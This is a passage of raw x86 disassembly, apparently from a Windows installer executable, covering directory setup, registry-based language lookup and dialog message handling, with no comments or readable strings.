  4032f7:	88 1f                	mov    %bl,(%edi)
  4032f9:	83 c7 04             	add    $0x4,%edi
  4032fc:	57                   	push   %edi
  4032fd:	e8 7b 22 00 00       	call   0x40557d
  403302:	85 c0                	test   %eax,%eax
  403304:	74 28                	je     0x40332e
  403306:	57                   	push   %edi
  403307:	68 00 54 43 00       	push   $0x435400
  40330c:	e8 93 26 00 00       	call   0x4059a4
  403311:	57                   	push   %edi
  403312:	68 00 58 43 00       	push   $0x435800
  403317:	e8 88 26 00 00       	call   0x4059a4
  40331c:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  40331f:	83 0d cc f0 42 00 ff 	orl    $0xffffffff,0x42f0cc
  403326:	e8 03 02 00 00       	call   0x40352e
  40332b:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40332e:	e8 d6 01 00 00       	call   0x403509
  403333:	ff 15 74 72 40 00    	call   *0x407274
  403339:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  40333c:	0f 84 1c 01 00 00    	je     0x40345e
  403342:	68 10 00 20 00       	push   $0x200010
  403347:	ff 75 f8             	push   -0x8(%ebp)
  40334a:	e8 4b 1f 00 00       	call   0x40529a
  40334f:	6a 02                	push   $0x2
  403351:	ff 15 44 71 40 00    	call   *0x407144
  403357:	a1 14 92 40 00       	mov    0x409214,%eax
  40335c:	bf 00 64 43 00       	mov    $0x436400,%edi
  403361:	89 45 e8             	mov    %eax,-0x18(%ebp)
  403364:	a1 18 92 40 00       	mov    0x409218,%eax
  403369:	68 08 92 40 00       	push   $0x409208
  40336e:	57                   	push   %edi
  40336f:	89 45 ec             	mov    %eax,-0x14(%ebp)
  403372:	e8 49 26 00 00       	call   0x4059c0
  403377:	53                   	push   %ebx
  403378:	57                   	push   %edi
  403379:	ff 15 84 70 40 00    	call   *0x407084
  40337f:	38 1d 00 54 43 00    	cmp    %bl,0x435400
  403385:	75 0f                	jne    0x403396
  403387:	68 00 5c 43 00       	push   $0x435c00
  40338c:	68 00 54 43 00       	push   $0x435400
  403391:	e8 0e 26 00 00       	call   0x4059a4
  403396:	ff 75 f0             	push   -0x10(%ebp)
  403399:	68 00 00 43 00       	push   $0x430000
  40339e:	e8 01 26 00 00       	call   0x4059a4
  4033a3:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4033a6:	50                   	push   %eax
  4033a7:	68 00 04 43 00       	push   $0x430400
  4033ac:	e8 f3 25 00 00       	call   0x4059a4
  4033b1:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4033b4:	be 40 8c 42 00       	mov    $0x428c40,%esi
  4033b9:	a1 28 f0 42 00       	mov    0x42f028,%eax
  4033be:	ff b0 20 01 00 00    	push   0x120(%eax)
  4033c4:	56                   	push   %esi
  4033c5:	e8 fc 25 00 00       	call   0x4059c6
  4033ca:	56                   	push   %esi
  4033cb:	ff 15 40 71 40 00    	call   *0x407140
  4033d1:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  4033d4:	74 70                	je     0x403446
  4033d6:	68 00 04 00 00       	push   $0x400
  4033db:	68 40 90 42 00       	push   $0x429040
  4033e0:	53                   	push   %ebx
  4033e1:	ff 15 94 70 40 00    	call   *0x407094
  4033e7:	8d 4d e9             	lea    -0x17(%ebp),%ecx
  4033ea:	8d 80 3a 90 42 00    	lea    0x42903a(%eax),%eax
  4033f0:	51                   	push   %ecx
  4033f1:	50                   	push   %eax
  4033f2:	ff 15 e8 70 40 00    	call   *0x4070e8
  4033f8:	85 c0                	test   %eax,%eax
  4033fa:	0f 84 2e ff ff ff    	je     0x40332e
  403400:	6a 01                	push   $0x1
  403402:	56                   	push   %esi
  403403:	68 40 90 42 00       	push   $0x429040
  403408:	ff 15 a0 70 40 00    	call   *0x4070a0
  40340e:	85 c0                	test   %eax,%eax
  403410:	74 34                	je     0x403446
  403412:	53                   	push   %ebx
  403413:	56                   	push   %esi
  403414:	e8 de 22 00 00       	call   0x4056f7
  403419:	53                   	push   %ebx
  40341a:	57                   	push   %edi
  40341b:	e8 d7 22 00 00       	call   0x4056f7
  403420:	a1 28 f0 42 00       	mov    0x42f028,%eax
  403425:	ff b0 24 01 00 00    	push   0x124(%eax)
  40342b:	56                   	push   %esi
  40342c:	e8 95 25 00 00       	call   0x4059c6
  403431:	57                   	push   %edi
  403432:	56                   	push   %esi
  403433:	e8 ea 1d 00 00       	call   0x405222
  403438:	3b c3                	cmp    %ebx,%eax
  40343a:	74 0a                	je     0x403446
  40343c:	50                   	push   %eax
  40343d:	ff 15 a4 70 40 00    	call   *0x4070a4
  403443:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  403446:	fe 05 00 04 43 00    	incb   0x430400
  40344c:	ff 45 fc             	incl   -0x4(%ebp)
  40344f:	83 7d fc 1a          	cmpl   $0x1a,-0x4(%ebp)
  403453:	0f 8c 60 ff ff ff    	jl     0x4033b9
  403459:	e9 d0 fe ff ff       	jmp    0x40332e
  40345e:	39 1d b4 f0 42 00    	cmp    %ebx,0x42f0b4
  403464:	0f 84 89 00 00 00    	je     0x4034f3
  40346a:	be f8 91 40 00       	mov    $0x4091f8,%esi
  40346f:	68 e4 91 40 00       	push   $0x4091e4
  403474:	56                   	push   %esi
  403475:	e8 30 28 00 00       	call   0x405caa
  40347a:	68 cc 91 40 00       	push   $0x4091cc
  40347f:	56                   	push   %esi
  403480:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403483:	e8 22 28 00 00       	call   0x405caa
  403488:	68 b4 91 40 00       	push   $0x4091b4
  40348d:	56                   	push   %esi
  40348e:	8b f8                	mov    %eax,%edi
  403490:	e8 15 28 00 00       	call   0x405caa
  403495:	39 5d fc             	cmp    %ebx,-0x4(%ebp)
  403498:	8b f0                	mov    %eax,%esi
  40349a:	74 43                	je     0x4034df
  40349c:	3b fb                	cmp    %ebx,%edi
  40349e:	74 3f                	je     0x4034df
  4034a0:	3b f3                	cmp    %ebx,%esi
  4034a2:	74 3b                	je     0x4034df
  4034a4:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4034a7:	50                   	push   %eax
  4034a8:	6a 28                	push   $0x28
  4034aa:	ff 15 9c 70 40 00    	call   *0x40709c
  4034b0:	50                   	push   %eax
  4034b1:	ff 55 fc             	call   *-0x4(%ebp)
  4034b4:	85 c0                	test   %eax,%eax
  4034b6:	74 27                	je     0x4034df
  4034b8:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4034bb:	50                   	push   %eax
  4034bc:	68 a0 91 40 00       	push   $0x4091a0
  4034c1:	53                   	push   %ebx
  4034c2:	ff d7                	call   *%edi
  4034c4:	53                   	push   %ebx
  4034c5:	53                   	push   %ebx
  4034c6:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4034c9:	53                   	push   %ebx
  4034ca:	50                   	push   %eax
  4034cb:	53                   	push   %ebx
  4034cc:	ff 75 f0             	push   -0x10(%ebp)
  4034cf:	c7 45 e0 01 00 00 00 	movl   $0x1,-0x20(%ebp)
  4034d6:	c7 45 ec 02 00 00 00 	movl   $0x2,-0x14(%ebp)
  4034dd:	ff d6                	call   *%esi
  4034df:	53                   	push   %ebx
  4034e0:	6a 02                	push   $0x2
  4034e2:	ff 15 18 72 40 00    	call   *0x407218
  4034e8:	85 c0                	test   %eax,%eax
  4034ea:	75 07                	jne    0x4034f3
  4034ec:	6a 09                	push   $0x9
  4034ee:	e8 1d df ff ff       	call   0x401410
  4034f3:	a1 cc f0 42 00       	mov    0x42f0cc,%eax
  4034f8:	83 f8 ff             	cmp    $0xffffffff,%eax
  4034fb:	74 03                	je     0x403500
  4034fd:	89 45 f4             	mov    %eax,-0xc(%ebp)
  403500:	ff 75 f4             	push   -0xc(%ebp)
  403503:	ff 15 44 71 40 00    	call   *0x407144
  403509:	a1 20 90 40 00       	mov    0x409020,%eax
  40350e:	83 f8 ff             	cmp    $0xffffffff,%eax
  403511:	74 0e                	je     0x403521
  403513:	50                   	push   %eax
  403514:	ff 15 a4 70 40 00    	call   *0x4070a4
  40351a:	83 0d 20 90 40 00 ff 	orl    $0xffffffff,0x409020
  403521:	6a 07                	push   $0x7
  403523:	68 00 68 43 00       	push   $0x436800
  403528:	e8 af 1d 00 00       	call   0x4052dc
  40352d:	c3                   	ret
  40352e:	83 ec 14             	sub    $0x14,%esp
  403531:	53                   	push   %ebx
  403532:	55                   	push   %ebp
  403533:	56                   	push   %esi
  403534:	8b 35 28 f0 42 00    	mov    0x42f028,%esi
  40353a:	57                   	push   %edi
  40353b:	68 ec 72 40 00       	push   $0x4072ec
  403540:	68 b4 92 40 00       	push   $0x4092b4
  403545:	e8 60 27 00 00       	call   0x405caa
  40354a:	33 db                	xor    %ebx,%ebx
  40354c:	3b c3                	cmp    %ebx,%eax
  40354e:	74 12                	je     0x403562
  403550:	ff d0                	call   *%eax
  403552:	0f b7 c0             	movzwl %ax,%eax
  403555:	50                   	push   %eax
  403556:	68 00 60 43 00       	push   $0x436000
  40355b:	e8 a2 23 00 00       	call   0x405902
  403560:	eb 48                	jmp    0x4035aa
  403562:	bf 88 a4 42 00       	mov    $0x42a488,%edi
  403567:	c7 05 00 60 43 00 30 	movl   $0x7830,0x436000
  40356e:	78 00 00 
  403571:	57                   	push   %edi
  403572:	53                   	push   %ebx
  403573:	68 c4 72 40 00       	push   $0x4072c4
  403578:	68 01 00 00 80       	push   $0x80000001
  40357d:	e8 16 23 00 00       	call   0x405898
  403582:	38 1d 88 a4 42 00    	cmp    %bl,0x42a488
  403588:	75 15                	jne    0x40359f
  40358a:	57                   	push   %edi
  40358b:	68 e2 72 40 00       	push   $0x4072e2
  403590:	68 9c 72 40 00       	push   $0x40729c
  403595:	68 03 00 00 80       	push   $0x80000003
  40359a:	e8 f9 22 00 00       	call   0x405898
  40359f:	57                   	push   %edi
  4035a0:	68 00 60 43 00       	push   $0x436000
  4035a5:	e8 16 24 00 00       	call   0x4059c0
  4035aa:	e8 4b 02 00 00       	call   0x4037fa
  4035af:	a1 30 f0 42 00       	mov    0x42f030,%eax
  4035b4:	bd 00 54 43 00       	mov    $0x435400,%ebp
  4035b9:	83 e0 20             	and    $0x20,%eax
  4035bc:	55                   	push   %ebp
  4035bd:	a3 a0 f0 42 00       	mov    %eax,0x42f0a0
  4035c2:	e8 b6 1f 00 00       	call   0x40557d
  4035c7:	85 c0                	test   %eax,%eax
  4035c9:	0f 85 80 00 00 00    	jne    0x40364f
  4035cf:	8b 4e 48             	mov    0x48(%esi),%ecx
  4035d2:	3b cb                	cmp    %ebx,%ecx
  4035d4:	74 79                	je     0x40364f
  4035d6:	8b 56 4c             	mov    0x4c(%esi),%edx
  4035d9:	a1 58 f0 42 00       	mov    0x42f058,%eax
  4035de:	bf c0 df 42 00       	mov    $0x42dfc0,%edi
  4035e3:	03 d0                	add    %eax,%edx
  4035e5:	57                   	push   %edi
  4035e6:	03 c8                	add    %eax,%ecx
  4035e8:	52                   	push   %edx
  4035e9:	51                   	push   %ecx
  4035ea:	ff 76 44             	push   0x44(%esi)
  4035ed:	e8 a6 22 00 00       	call   0x405898
  4035f2:	a0 c0 df 42 00       	mov    0x42dfc0,%al
  4035f7:	3a c3                	cmp    %bl,%al
  4035f9:	74 54                	je     0x40364f
  4035fb:	3c 22                	cmp    $0x22,%al
  4035fd:	75 0f                	jne    0x40360e
  4035ff:	bf c1 df 42 00       	mov    $0x42dfc1,%edi
  403604:	6a 22                	push   $0x22
  403606:	57                   	push   %edi
  403607:	e8 bc 1e 00 00       	call   0x4054c8
  40360c:	88 18                	mov    %bl,(%eax)
  40360e:	57                   	push   %edi
  40360f:	e8 a6 23 00 00       	call   0x4059ba
  403614:	8d 44 38 fc          	lea    -0x4(%eax,%edi,1),%eax
  403618:	3b c7                	cmp    %edi,%eax
  40361a:	76 26                	jbe    0x403642
  40361c:	68 ac 92 40 00       	push   $0x4092ac
  403621:	50                   	push   %eax
  403622:	ff 15 e8 70 40 00    	call   *0x4070e8
  403628:	85 c0                	test   %eax,%eax
  40362a:	75 16                	jne    0x403642
  40362c:	57                   	push   %edi
  40362d:	ff 15 7c 70 40 00    	call   *0x40707c
  403633:	83 f8 ff             	cmp    $0xffffffff,%eax
  403636:	74 04                	je     0x40363c
  403638:	a8 10                	test   $0x10,%al
  40363a:	75 06                	jne    0x403642
  40363c:	57                   	push   %edi
  40363d:	e8 a2 1e 00 00       	call   0x4054e4
  403642:	57                   	push   %edi
  403643:	e8 55 1e 00 00       	call   0x40549d
  403648:	50                   	push   %eax
  403649:	55                   	push   %ebp
  40364a:	e8 55 23 00 00       	call   0x4059a4
  40364f:	55                   	push   %ebp
  403650:	e8 28 1f 00 00       	call   0x40557d
  403655:	85 c0                	test   %eax,%eax
  403657:	75 0c                	jne    0x403665
  403659:	ff b6 18 01 00 00    	push   0x118(%esi)
  40365f:	55                   	push   %ebp
  403660:	e8 61 23 00 00       	call   0x4059c6
  403665:	68 40 80 00 00       	push   $0x8040
  40366a:	53                   	push   %ebx
  40366b:	53                   	push   %ebx
  40366c:	6a 01                	push   $0x1
  40366e:	6a 67                	push   $0x67
  403670:	ff 35 20 f0 42 00    	push   0x42f020
  403676:	ff 15 28 72 40 00    	call   *0x407228
  40367c:	a3 08 e8 42 00       	mov    %eax,0x42e808
  403681:	83 7e 50 ff          	cmpl   $0xffffffff,0x50(%esi)
  403685:	bf c0 e7 42 00       	mov    $0x42e7c0,%edi
  40368a:	0f 84 89 00 00 00    	je     0x403719
  403690:	8b 0d 20 f0 42 00    	mov    0x42f020,%ecx
  403696:	a3 d4 e7 42 00       	mov    %eax,0x42e7d4
  40369b:	8d 44 24 10          	lea    0x10(%esp),%eax
  40369f:	57                   	push   %edi
  4036a0:	c7 44 24 14 5f 4e 62 	movl   $0x624e5f,0x14(%esp)
  4036a7:	00 
  4036a8:	c7 05 c4 e7 42 00 00 	movl   $0x401000,0x42e7c4
  4036af:	10 40 00 
  4036b2:	89 0d d0 e7 42 00    	mov    %ecx,0x42e7d0
  4036b8:	a3 e4 e7 42 00       	mov    %eax,0x42e7e4
  4036bd:	ff 15 b4 71 40 00    	call   *0x4071b4
  4036c3:	66 85 c0             	test   %ax,%ax
  4036c6:	0f 84 24 01 00 00    	je     0x4037f0
  4036cc:	8d 44 24 14          	lea    0x14(%esp),%eax
  4036d0:	53                   	push   %ebx
  4036d1:	50                   	push   %eax
  4036d2:	53                   	push   %ebx
  4036d3:	6a 30                	push   $0x30
  4036d5:	ff 15 00 72 40 00    	call   *0x407200
  4036db:	53                   	push   %ebx
  4036dc:	ff 35 20 f0 42 00    	push   0x42f020
  4036e2:	8b 44 24 28          	mov    0x28(%esp),%eax
  4036e6:	2b 44 24 20          	sub    0x20(%esp),%eax
  4036ea:	53                   	push   %ebx
  4036eb:	53                   	push   %ebx
  4036ec:	50                   	push   %eax
  4036ed:	8b 44 24 30          	mov    0x30(%esp),%eax
  4036f1:	2b 44 24 28          	sub    0x28(%esp),%eax
  4036f5:	50                   	push   %eax
  4036f6:	8d 44 24 28          	lea    0x28(%esp),%eax
  4036fa:	ff 74 24 30          	push   0x30(%esp)
  4036fe:	ff 74 24 30          	push   0x30(%esp)
  403702:	68 00 00 00 80       	push   $0x80000000
  403707:	53                   	push   %ebx
  403708:	50                   	push   %eax
  403709:	68 80 00 00 00       	push   $0x80
  40370e:	ff 15 04 72 40 00    	call   *0x407204
  403714:	a3 60 a4 42 00       	mov    %eax,0x42a460
  403719:	53                   	push   %ebx
  40371a:	e8 f1 dc ff ff       	call   0x401410
  40371f:	85 c0                	test   %eax,%eax
  403721:	74 08                	je     0x40372b
  403723:	6a 02                	push   $0x2
  403725:	58                   	pop    %eax
  403726:	e9 c7 00 00 00       	jmp    0x4037f2
  40372b:	e8 ca 00 00 00       	call   0x4037fa
  403730:	39 1d c0 f0 42 00    	cmp    %ebx,0x42f0c0
  403736:	0f 85 8b 00 00 00    	jne    0x4037c7
  40373c:	6a 05                	push   $0x5
  40373e:	ff 35 60 a4 42 00    	push   0x42a460
  403744:	ff 15 f4 71 40 00    	call   *0x4071f4
  40374a:	8b 35 b4 70 40 00    	mov    0x4070b4,%esi
  403750:	bd 9c 92 40 00       	mov    $0x40929c,%ebp
  403755:	55                   	push   %ebp
  403756:	ff d6                	call   *%esi
  403758:	85 c0                	test   %eax,%eax
  40375a:	75 0c                	jne    0x403768
  40375c:	55                   	push   %ebp
  40375d:	66 c7 05 a2 92 40 00 	movw   $0x3233,0x4092a2
  403764:	33 32 
  403766:	ff d6                	call   *%esi
  403768:	8b 2d 08 72 40 00    	mov    0x407208,%ebp
  40376e:	be 90 92 40 00       	mov    $0x409290,%esi
  403773:	57                   	push   %edi
  403774:	56                   	push   %esi
  403775:	53                   	push   %ebx
  403776:	ff d5                	call   *%ebp
  403778:	85 c0                	test   %eax,%eax
  40377a:	75 1f                	jne    0x40379b
  40377c:	57                   	push   %edi
  40377d:	56                   	push   %esi
  40377e:	53                   	push   %ebx
  40377f:	88 1d 98 92 40 00    	mov    %bl,0x409298
  403785:	ff d5                	call   *%ebp
  403787:	57                   	push   %edi
  403788:	89 35 e4 e7 42 00    	mov    %esi,0x42e7e4
  40378e:	c6 05 98 92 40 00 32 	movb   $0x32,0x409298
  403795:	ff 15 b4 71 40 00    	call   *0x4071b4
  40379b:	a1 00 e8 42 00       	mov    0x42e800,%eax
  4037a0:	53                   	push   %ebx
  4037a1:	83 c0 69             	add    $0x69,%eax
  4037a4:	68 c7 38 40 00       	push   $0x4038c7
  4037a9:	0f b7 c0             	movzwl %ax,%eax
  4037ac:	53                   	push   %ebx
  4037ad:	50                   	push   %eax
  4037ae:	ff 35 20 f0 42 00    	push   0x42f020
  4037b4:	ff 15 0c 72 40 00    	call   *0x40720c
  4037ba:	6a 05                	push   $0x5
  4037bc:	8b f0                	mov    %eax,%esi
  4037be:	e8 4d dc ff ff       	call   0x401410
  4037c3:	8b c6                	mov    %esi,%eax
  4037c5:	eb 2b                	jmp    0x4037f2
  4037c7:	53                   	push   %ebx
  4037c8:	e8 6e 16 00 00       	call   0x404e3b
  4037cd:	85 c0                	test   %eax,%eax
  4037cf:	74 18                	je     0x4037e9
  4037d1:	39 1d ec e7 42 00    	cmp    %ebx,0x42e7ec
  4037d7:	0f 85 46 ff ff ff    	jne    0x403723
  4037dd:	6a 02                	push   $0x2
  4037df:	e8 2c dc ff ff       	call   0x401410
  4037e4:	e9 3a ff ff ff       	jmp    0x403723
  4037e9:	6a 01                	push   $0x1
  4037eb:	e8 20 dc ff ff       	call   0x401410
  4037f0:	33 c0                	xor    %eax,%eax
  4037f2:	5f                   	pop    %edi
  4037f3:	5e                   	pop    %esi
  4037f4:	5d                   	pop    %ebp
  4037f5:	5b                   	pop    %ebx
  4037f6:	83 c4 14             	add    $0x14,%esp
  4037f9:	c3                   	ret
  4037fa:	53                   	push   %ebx
  4037fb:	55                   	push   %ebp
  4037fc:	56                   	push   %esi
  4037fd:	57                   	push   %edi
  4037fe:	bf 00 60 43 00       	mov    $0x436000,%edi
  403803:	bb ff ff 00 00       	mov    $0xffff,%ebx
  403808:	57                   	push   %edi
  403809:	e8 0d 21 00 00       	call   0x40591b
  40380e:	8b 35 64 f0 42 00    	mov    0x42f064,%esi
  403814:	85 f6                	test   %esi,%esi
  403816:	74 45                	je     0x40385d
  403818:	8b 0d 28 f0 42 00    	mov    0x42f028,%ecx
  40381e:	8b 49 64             	mov    0x64(%ecx),%ecx
  403821:	8b d1                	mov    %ecx,%edx
  403823:	0f af ce             	imul   %esi,%ecx
  403826:	f7 da                	neg    %edx
  403828:	03 0d 60 f0 42 00    	add    0x42f060,%ecx
  40382e:	03 ca                	add    %edx,%ecx
  403830:	4e                   	dec    %esi
  403831:	66 8b 29             	mov    (%ecx),%bp
  403834:	66 33 e8             	xor    %ax,%bp
  403837:	23 eb                	and    %ebx,%ebp
  403839:	66 85 ed             	test   %bp,%bp
  40383c:	74 06                	je     0x403844
  40383e:	85 f6                	test   %esi,%esi
  403840:	75 ec                	jne    0x40382e
  403842:	eb 19                	jmp    0x40385d
  403844:	8b 51 02             	mov    0x2(%ecx),%edx
  403847:	89 15 00 e8 42 00    	mov    %edx,0x42e800
  40384d:	8b 51 06             	mov    0x6(%ecx),%edx
  403850:	89 15 c8 f0 42 00    	mov    %edx,0x42f0c8
  403856:	8d 51 0a             	lea    0xa(%ecx),%edx
  403859:	85 d2                	test   %edx,%edx
  40385b:	75 12                	jne    0x40386f
  40385d:	66 81 fb ff ff       	cmp    $0xffff,%bx
  403862:	75 07                	jne    0x40386b
  403864:	bb ff 03 00 00       	mov    $0x3ff,%ebx
  403869:	eb a3                	jmp    0x40380e
  40386b:	33 db                	xor    %ebx,%ebx
  40386d:	eb 9f                	jmp    0x40380e
  40386f:	89 15 fc e7 42 00    	mov    %edx,0x42e7fc
  403875:	0f b7 01             	movzwl (%ecx),%eax
  403878:	50                   	push   %eax
  403879:	57                   	push   %edi
  40387a:	e8 83 20 00 00       	call   0x405902
  40387f:	6a fe                	push   $0xfffffffe
  403881:	68 20 e8 42 00       	push   $0x42e820
  403886:	e8 3b 21 00 00       	call   0x4059c6
  40388b:	50                   	push   %eax
  40388c:	ff 35 60 a4 42 00    	push   0x42a460
  403892:	ff 15 e8 71 40 00    	call   *0x4071e8
  403898:	a1 4c f0 42 00       	mov    0x42f04c,%eax
  40389d:	8b 35 48 f0 42 00    	mov    0x42f048,%esi
  4038a3:	85 c0                	test   %eax,%eax
  4038a5:	74 1b                	je     0x4038c2
  4038a7:	8b f8                	mov    %eax,%edi
  4038a9:	8b 06                	mov    (%esi),%eax
  4038ab:	85 c0                	test   %eax,%eax
  4038ad:	74 0a                	je     0x4038b9
  4038af:	50                   	push   %eax
  4038b0:	8d 46 18             	lea    0x18(%esi),%eax
  4038b3:	50                   	push   %eax
  4038b4:	e8 0d 21 00 00       	call   0x4059c6
  4038b9:	81 c6 18 04 00 00    	add    $0x418,%esi
  4038bf:	4f                   	dec    %edi
  4038c0:	75 e7                	jne    0x4038a9
  4038c2:	5f                   	pop    %edi
  4038c3:	5e                   	pop    %esi
  4038c4:	5d                   	pop    %ebp
  4038c5:	5b                   	pop    %ebx
  4038c6:	c3                   	ret
  4038c7:	83 ec 10             	sub    $0x10,%esp
  4038ca:	b9 10 01 00 00       	mov    $0x110,%ecx
  4038cf:	53                   	push   %ebx
  4038d0:	55                   	push   %ebp
  4038d1:	8b 6c 24 20          	mov    0x20(%esp),%ebp
  4038d5:	56                   	push   %esi
  4038d6:	3b e9                	cmp    %ecx,%ebp
  4038d8:	57                   	push   %edi
  4038d9:	0f 84 73 01 00 00    	je     0x403a52
  4038df:	81 fd 08 04 00 00    	cmp    $0x408,%ebp
  4038e5:	0f 84 67 01 00 00    	je     0x403a52
  4038eb:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  4038ef:	83 fd 47             	cmp    $0x47,%ebp
  4038f2:	75 15                	jne    0x403909
  4038f4:	33 c0                	xor    %eax,%eax
  4038f6:	6a 13                	push   $0x13
  4038f8:	50                   	push   %eax
  4038f9:	50                   	push   %eax
  4038fa:	50                   	push   %eax
  4038fb:	50                   	push   %eax
  4038fc:	53                   	push   %ebx
  4038fd:	ff 35 60 a4 42 00    	push   0x42a460
  403903:	ff 15 7c 71 40 00    	call   *0x40717c
  403909:	83 fd 05             	cmp    $0x5,%ebp
  40390c:	75 18                	jne    0x403926
  40390e:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403912:	48                   	dec    %eax
  403913:	f7 d8                	neg    %eax
  403915:	1b c0                	sbb    %eax,%eax
  403917:	23 c5                	and    %ebp,%eax
  403919:	50                   	push   %eax
  40391a:	ff 35 60 a4 42 00    	push   0x42a460
  403920:	ff 15 f4 71 40 00    	call   *0x4071f4
  403926:	81 fd 0d 04 00 00    	cmp    $0x40d,%ebp
  40392c:	75 1a                	jne    0x403948
  40392e:	ff 35 f8 e7 42 00    	push   0x42e7f8
  403934:	ff 15 e0 71 40 00    	call   *0x4071e0
  40393a:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  40393e:	a3 f8 e7 42 00       	mov    %eax,0x42e7f8
  403943:	e9 0f 04 00 00       	jmp    0x403d57
  403948:	83 fd 11             	cmp    $0x11,%ebp
  40394b:	75 13                	jne    0x403960
  40394d:	6a 00                	push   $0x0
  40394f:	6a 00                	push   $0x0
  403951:	53                   	push   %ebx
  403952:	ff 15 24 72 40 00    	call   *0x407224
  403958:	33 c0                	xor    %eax,%eax
  40395a:	40                   	inc    %eax
  40395b:	e9 1e 04 00 00       	jmp    0x403d7e
  403960:	83 fd 10             	cmp    $0x10,%ebp
  403963:	75 33                	jne    0x403998
  403965:	a1 44 f0 42 00       	mov    0x42f044,%eax
  40396a:	48                   	dec    %eax
  40396b:	39 05 74 92 40 00    	cmp    %eax,0x409274
  403971:	0f 85 c8 00 00 00    	jne    0x403a3f
  403977:	ff 35 48 94 42 00    	push   0x429448
  40397d:	ff 15 78 71 40 00    	call   *0x407178
  403983:	85 c0                	test   %eax,%eax
  403985:	0f 85 b4 00 00 00    	jne    0x403a3f
  40398b:	bd 11 01 00 00       	mov    $0x111,%ebp
  403990:	c7 44 24 2c 01 00 00 	movl   $0x1,0x2c(%esp)
  403997:	00 
  403998:	81 fd 11 01 00 00    	cmp    $0x111,%ebp
  40399e:	0f 85 9b 00 00 00    	jne    0x403a3f
  4039a4:	0f b7 74 24 2c       	movzwl 0x2c(%esp),%esi
  4039a9:	56                   	push   %esi
  4039aa:	53                   	push   %ebx
  4039ab:	ff 15 20 72 40 00    	call   *0x407220
  4039b1:	8b 1d 38 72 40 00    	mov    0x407238,%ebx
  4039b7:	8b f8                	mov    %eax,%edi
  4039b9:	85 ff                	test   %edi,%edi
  4039bb:	74 1b                	je     0x4039d8
  4039bd:	6a 00                	push   $0x0
  4039bf:	6a 00                	push   $0x0
  4039c1:	68 f3 00 00 00       	push   $0xf3
  4039c6:	57                   	push   %edi
  4039c7:	ff d3                	call   *%ebx
  4039c9:	57                   	push   %edi
  4039ca:	ff 15 78 71 40 00    	call   *0x407178
  4039d0:	85 c0                	test   %eax,%eax
  4039d2:	0f 84 a4 03 00 00    	je     0x403d7c
  4039d8:	33 ff                	xor    %edi,%edi
  4039da:	47                   	inc    %edi
  4039db:	3b f7                	cmp    %edi,%esi
  4039dd:	75 03                	jne    0x4039e2
  4039df:	57                   	push   %edi
  4039e0:	eb 2e                	jmp    0x403a10
  4039e2:	83 fe 03             	cmp    $0x3,%esi
  4039e5:	75 0d                	jne    0x4039f4
  4039e7:	83 3d 74 92 40 00 00 	cmpl   $0x0,0x409274
  4039ee:	7e 3a                	jle    0x403a2a
  4039f0:	6a ff                	push   $0xffffffff
  4039f2:	eb 1c                	jmp    0x403a10
  4039f4:	83 fe 02             	cmp    $0x2,%esi
  4039f7:	75 31                	jne    0x403a2a
  4039f9:	83 3d ac f0 42 00 00 	cmpl   $0x0,0x42f0ac
  403a00:	74 15                	je     0x403a17
  403a02:	56                   	push   %esi
  403a03:	e8 08 da ff ff       	call   0x401410
  403a08:	89 35 50 98 42 00    	mov    %esi,0x429850
  403a0e:	6a 78                	push   $0x78
  403a10:	e8 73 03 00 00       	call   0x403d88
  403a15:	eb 28                	jmp    0x403a3f
  403a17:	6a 03                	push   $0x3
  403a19:	e8 f2 d9 ff ff       	call   0x401410
  403a1e:	85 c0                	test   %eax,%eax
  403a20:	75 1d                	jne    0x403a3f
  403a22:	89 3d 50 98 42 00    	mov    %edi,0x429850
  403a28:	eb e4                	jmp    0x403a0e
  403a2a:	ff 74 24 30          	push   0x30(%esp)
  403a2e:	ff 74 24 30          	push   0x30(%esp)
  403a32:	68 11 01 00 00       	push   $0x111
  403a37:	ff 35 f8 e7 42 00    	push   0x42e7f8
  403a3d:	ff d3                	call   *%ebx
  403a3f:	ff 74 24 30          	push   0x30(%esp)
  403a43:	ff 74 24 30          	push   0x30(%esp)
  403a47:	55                   	push   %ebp
  403a48:	e8 c9 03 00 00       	call   0x403e16
  403a4d:	e9 2c 03 00 00       	jmp    0x403d7e
  403a52:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403a56:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  403a5a:	3b e9                	cmp    %ecx,%ebp
  403a5c:	a3 6c a4 42 00       	mov    %eax,0x42a46c
  403a61:	75 4d                	jne    0x403ab0
  403a63:	8b 35 20 72 40 00    	mov    0x407220,%esi
  403a69:	6a 01                	push   $0x1
  403a6b:	53                   	push   %ebx
  403a6c:	89 1d 24 f0 42 00    	mov    %ebx,0x42f024
  403a72:	ff d6                	call   *%esi
  403a74:	6a 02                	push   $0x2
  403a76:	53                   	push   %ebx
  403a77:	a3 80 a4 42 00       	mov    %eax,0x42a480
  403a7c:	ff d6                	call   *%esi
  403a7e:	6a ff                	push   $0xffffffff
  403a80:	6a 1c                	push   $0x1c
  403a82:	53                   	push   %ebx
  403a83:	a3 48 94 42 00       	mov    %eax,0x429448
  403a88:	e8 22 03 00 00       	call   0x403daf
  403a8d:	ff 35 08 e8 42 00    	push   0x42e808
  403a93:	6a f2                	push   $0xfffffff2
  403a95:	53                   	push   %ebx
  403a96:	ff 15 74 71 40 00    	call   *0x407174
  403a9c:	6a 04                	push   $0x4
  403a9e:	e8 6d d9 ff ff       	call   0x401410
  403aa3:	a3 ec e7 42 00       	mov    %eax,0x42e7ec
  403aa8:	33 c0                	xor    %eax,%eax
  403aaa:	40                   	inc    %eax
  403aab:	a3 6c a4 42 00       	mov    %eax,0x42a46c
  403ab0:	8b 0d 74 92 40 00    	mov    0x409274,%ecx
  403ab6:	33 ff                	xor    %edi,%edi
  403ab8:	8b f1                	mov    %ecx,%esi
  403aba:	c1 e6 06             	shl    $0x6,%esi
  403abd:	03 35 40 f0 42 00    	add    0x42f040,%esi
